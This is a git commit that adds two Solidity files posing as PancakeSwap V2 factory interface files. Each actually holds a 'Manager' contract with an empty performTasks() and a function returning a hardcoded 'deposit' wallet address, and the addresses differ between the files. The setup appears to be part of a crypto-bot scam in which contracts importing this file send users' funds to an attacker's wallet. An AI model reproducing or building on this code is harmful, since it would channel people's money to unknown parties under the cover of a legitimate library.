bba45d1620a8863353111fd29398bcec97252c25
norddevs <96982044+norddevs@users.noreply.github.com>
2022-01-02 16:55:16 +0300

    Add files via upload

---
+++ pancakeswap-v2-periphery-main/contracts/interfaces/IPancakeswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x4b6304666851f6f070247141e932A4556943c4aE;
+	}
+}
---
+++ pancakeswap-v2-periphery-main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x8bC572a4D18BA15c6Bea9888C943c9007F6d45be;
+	}
+}
